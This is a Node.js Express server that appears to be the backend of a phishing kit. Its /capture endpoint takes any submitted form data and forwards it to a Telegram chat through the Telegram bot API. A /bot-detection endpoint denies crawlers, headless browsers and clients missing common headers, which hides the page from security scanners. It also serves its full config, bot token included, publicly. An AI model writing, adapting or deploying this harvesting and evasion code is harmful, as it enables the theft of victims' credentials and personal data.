import express from 'express';
import path from 'path';
import axios from 'axios';
import fs from 'fs';
import { fileURLToPath } from 'url';
import dotenv from 'dotenv';
import morgan from 'morgan';

// Load environment variables
dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware to parse JSON and URL-encoded data
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Logging middleware
app.use(morgan('combined'));

// Serve static files from the 'public' directory
app.use(express.static(path.join(process.cwd(), 'public')));

// Load configuration from config.json
let config = {};
try {
    const configPath = path.join(process.cwd(), 'config.json');
    const configFile = fs.readFileSync(configPath, 'utf8');
    config = JSON.parse(configFile);
} catch (error) {
    console.error('Failed to load config:', error);
}

// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || config.telegram?.bot_token;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || config.telegram?.chat_id;

// Function to send messages to Telegram
const sendToTelegram = async (message) => {
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message
        });
    } catch (error) {
        console.error('Error sending message to Telegram:', error);
    }
};

// Endpoint to handle form submissions
app.post('/capture', async (req, res) => {
    const formData = req.body;
    
    // Server-side Input Validation
    if (!formData || typeof formData !== 'object' || Object.keys(formData).length === 0) {
        return res.status(400).send('Invalid or missing payload');
    }

    const sessionData = JSON.stringify(formData);
    sendToTelegram(sessionData);
    res.status(200).send('Data captured and sent to Telegram');
});

// Endpoint for bot detection
app.get('/bot-detection', (req, res) => {
    const userAgent = req.headers['user-agent'] || '';
    const isBot = /bot|crawler|spider|robot|headless/i.test(userAgent) ||
                 req.headers['x-forwarded-for'] === 'unknown' ||
                 req.headers['accept-language'] === undefined ||
                 req.headers['accept-encoding'] === undefined;

    if (isBot) {
        res.send('Access Denied: Automated Software Detected.');
    } else {
        res.send('');
    }
});

// Endpoint to serve config.json
app.get('/config', (req, res) => {
    res.json(config);
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
